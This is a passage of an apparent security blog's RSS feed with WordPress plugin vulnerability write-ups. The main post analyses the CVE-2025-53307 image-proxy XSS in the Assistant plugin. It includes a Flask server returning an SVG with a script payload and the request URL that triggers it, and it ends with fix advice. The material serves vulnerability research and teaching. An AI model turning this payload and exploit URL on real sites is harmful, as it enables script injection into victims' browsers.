0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;code&gt;CVE-2025-27006&lt;/code&gt; vulnerability in &lt;strong&gt;Authorsy &amp;lt;= 1.0.5&lt;/strong&gt; demonstrates &lt;strong&gt;Broken Access Control&lt;/strong&gt; combined with &lt;strong&gt;XSS&lt;/strong&gt;. Root causes:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;REST API lacks proper access control (&lt;code&gt;permission_callback&lt;/code&gt; always true).&lt;/li&gt;&#xA;&lt;li&gt;Custom CSS is inserted without &lt;strong&gt;sanitization&lt;/strong&gt;, enabling injection of &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tags.&lt;/li&gt;&#xA;&lt;li&gt;Nonce verification does not stop execution when invalid, making security checks ineffective.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Always use proper &lt;code&gt;permission_callback&lt;/code&gt; to prevent &lt;strong&gt;Broken Access Control&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Sanitize and escape user input before rendering in HTML/CSS/JS to prevent &lt;strong&gt;XSS&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/authorsy/vulnerability/wordpress-authorsy-plugin-1-0-5-cross-site-scripting-xss-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Authorsy Plugin &amp;lt;= 1.0.5 is vulnerable to Cross Site Scripting (XSS)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-53307 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-03-cve-2025-53307/</link>
      <pubDate>Fri, 03 Oct 2025 19:19:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-03-cve-2025-53307/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-03-cve-2025-53307/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;The vulnerability exists in the &lt;strong&gt;Assistant&lt;/strong&gt; plugin for WordPress prior to version &lt;strong&gt;3.6.2&lt;/strong&gt;. This could allow an attacker to inject malicious code (e.g., redirect scripts, ads, or other HTML payloads) into the website, which would execute when visitors open the page.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-53307&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-53307&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/assistant/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Assistant Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.5.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Assistant&lt;/strong&gt;: v1.5.2 (vulnerable) and v1.5.3 (patched)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; or any tool capable of comparing two versions&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The application displays user-provided image content directly via a URL &lt;strong&gt;without validating or fully checking the MIME type&lt;/strong&gt;. This allows an attacker to supply a file disguised as an image, which when processed by the browser, executes malicious code → resulting in an XSS vulnerability.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Use any diff tool to compare the vulnerable version and the patch.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-03-cve-2025-53307/patch_diff.png&#34; title=&#34;Diff between vulnerable and patched version&#34; data-thumbnail=&#34;/posts/2025-10-03-cve-2025-53307/patch_diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch Diff&lt;/h2&gt;&lt;p&gt;Diff between vulnerable and patched version&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-03-cve-2025-53307/patch_diff.png&#39; alt=&#34;Patch Diff&#34; height=&#34;946&#34; width=&#34;1618&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Diff between vulnerable and patched version&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;In this case, there are significant differences between the two versions. For easier tracking, the &lt;a href=&#34;https://wordpress.org/plugins/assistant/#developers&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;change log&lt;/a&gt; identifies where the XSS patch was applied:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;Changelog&#xA;1.5.3 (2025-09-08)&#xA;&#xA;- Changes to support the integration of Assistant in Beaver Builder version 2.10&#xA;- Fixed dark mode issues on the Home app and sidebar.&#xA;- Security: Fixed a potential XSS vulnerability in the &amp;#34;image proxy&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 The vulnerability is located in &lt;strong&gt;backend/src/Hooks/ImageProxy.php&lt;/strong&gt;. Observing the differences between the two versions:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-03-cve-2025-53307/patch_diff1.png&#34; title=&#34;Differences in the render_image function of ImageProxy.php&#34; data-thumbnail=&#34;/posts/2025-10-03-cve-2025-53307/patch_diff1.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch Diff 1&lt;/h2&gt;&lt;p&gt;Differences in the render_image function of ImageProxy.php&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-03-cve-2025-53307/patch_diff1.png&#39; alt=&#34;Patch Diff 1&#34; height=&#34;830&#34; width=&#34;1638&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Differences in the render_image function of ImageProxy.php&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The changes occur in the &lt;code&gt;render_image&lt;/code&gt; function, which:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Accepts a URL parameter from the query string &lt;code&gt;($_GET[&#39;url&#39;])&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Sends a request from the server to that URL to fetch the content.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Prevents &lt;strong&gt;SSRF&lt;/strong&gt; using &lt;code&gt;wp_safe_remote_get&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If the content has a &lt;strong&gt;Content-Type&lt;/strong&gt; header starting with &lt;code&gt;image/&lt;/code&gt;, then:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Sends the same &lt;strong&gt;Content-Type&lt;/strong&gt; header back to the client.&lt;/li&gt;&#xA;&lt;li&gt;Echoes the file content to the browser.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;The browser displays the image &lt;strong&gt;not directly from the original source but through the WordPress server&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;SVG files also have a &lt;strong&gt;Content-Type&lt;/strong&gt; starting with &lt;code&gt;image/&lt;/code&gt; and can contain embedded JavaScript → XSS can occur.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;The patch added an additional check to verify the &lt;strong&gt;actual MIME type&lt;/strong&gt; of the file to prevent XSS via SVG or maliciously disguised files.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$filesystem = self::filesystem();&#xA;$tmpfile    = tempnam( &amp;#39;/tmp&amp;#39;, &amp;#39;assistant&amp;#39; );&#xA;$filesystem-&amp;gt;put_contents( $tmpfile, $body );&#xA;$validimage = wp_get_image_mime( $tmpfile );&#xA;$filesystem-&amp;gt;delete( $tmpfile );&#xA;&#xA;if ( ! $validimage ) {&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/WordPress/wordpress-develop/blob/6.8.2/src/wp-includes/functions.php#L3330-L3417&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_get_image_mime()&lt;/code&gt;&lt;/a&gt; uses internal image processing (based on the binary data of the file) to determine the actual MIME type.&lt;/p&gt;&#xA;&lt;p&gt;If the result is not a valid image → returns &lt;strong&gt;false&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-works&#34;&gt;&lt;span&gt;How it works&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-works&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;In the &lt;code&gt;__construct&lt;/code&gt; of the &lt;code&gt;ImageProxy&lt;/code&gt; class, the &lt;code&gt;render_image()&lt;/code&gt; method is called via the &lt;code&gt;&#39;init&#39;&lt;/code&gt; action hook. The &lt;code&gt;&#39;init&#39;&lt;/code&gt; hook runs early in WordPress loading, after core objects are initialized but before output is sent to the browser.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;render_image&lt;/code&gt; is called only if the current user has permission to edit other users&amp;rsquo; posts and the &lt;code&gt;$_GET[&#39;fl_asst_image_proxy&#39;]&lt;/code&gt; parameter exists.&lt;/p&gt;&#xA;&lt;p&gt;👉 Accessing &lt;code&gt;/wp-admin/?fl_asst_image_proxy=value1&amp;amp;url=http://yoursite/image-path&lt;/code&gt; triggers &lt;code&gt;render_image&lt;/code&gt; and returns the image content to the browser.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-xss&#34;&gt;&lt;span&gt;Detect XSS&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-xss&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Create a simple &lt;a href=&#34;https://github.com/w41bu1/w41test&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;web page&lt;/a&gt; returning an SVG containing an XSS payload:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, Response&#xA;&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/&amp;#39;)&#xA;def home():&#xA;    return &amp;#39;Hello, World!&amp;#39;&#xA;&#xA;@app.route(&amp;#39;/svg&amp;#39;)&#xA;def about():&#xA;    svg = &amp;#34;&amp;#34;&amp;#34;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&#xA;    &amp;lt;svg xmlns=&amp;#34;http://www.w3.org/2000/svg&amp;#34;&amp;gt;&#xA;        &amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&#xA;    &amp;lt;/svg&amp;gt;&amp;#34;&amp;#34;&amp;#34;&#xA;    return Response(svg, mimetype=&amp;#34;image/svg&amp;#43;xml&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Send a request with the &lt;strong&gt;url parameter&lt;/strong&gt; pointing to &lt;code&gt;https://yoursite/svg&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;http://localhost/wp-admin/?fl_asst_image_proxy=abc&amp;amp;url=https://yoursite/svg&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 Successful for &lt;code&gt;Unauthenticated&lt;/code&gt; because as long as the user has permission, accessing the URL triggers XSS in the victim’s browser. The attacker does not need to log in.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-03-cve-2025-53307/detect.png&#34; title=&#34;SVG with XSS payload displayed via image proxy&#34; data-thumbnail=&#34;/posts/2025-10-03-cve-2025-53307/detect.png&#34; data-sub-html=&#34;&lt;h2&gt;Detect&lt;/h2&gt;&lt;p&gt;SVG with XSS payload displayed via image proxy&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-03-cve-2025-53307/detect.png&#39; alt=&#34;Detect&#34; height=&#34;318&#34; width=&#34;1264&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;SVG with XSS payload displayed via image proxy&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2025-53307&lt;/strong&gt; vulnerability in the WordPress Assistant plugin (&lt;strong&gt;&amp;lt;= v1.5.2&lt;/strong&gt;) allows XSS via &lt;code&gt;render_image()&lt;/code&gt; because it does not validate the actual file &lt;strong&gt;MIME type&lt;/strong&gt;. Version &lt;strong&gt;v1.5.3&lt;/strong&gt; patched this by verifying the file content before returning it to the browser.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Do not trust the &lt;strong&gt;Content-Type header&lt;/strong&gt; from &lt;strong&gt;HTTP responses&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Always validate the &lt;strong&gt;actual MIME type&lt;/strong&gt; of the file.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/assistant/vulnerability/wordpress-assistant-plugin-1-5-2-cross-site-scripting-xss-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Assistant Plugin &amp;lt;= 1.5.2 is vulnerable to Cross Site Scripting (XSS)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-6234 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-02-cve-2025-6234/</link>
      <pubDate>Thu, 02 Oct 2025 20:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-02-cve-2025-6234/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-02-cve-2025-6234/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;The vulnerability exists in the &lt;strong&gt;Hostel&lt;/strong&gt; plugin for WordPress prior to version &lt;strong&gt;1.1.5.8&lt;/strong&gt;. An attacker could exploit it to target high-privilege users like &lt;strong&gt;admins&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-6234&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-6234&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/hostel/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Hostel Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site 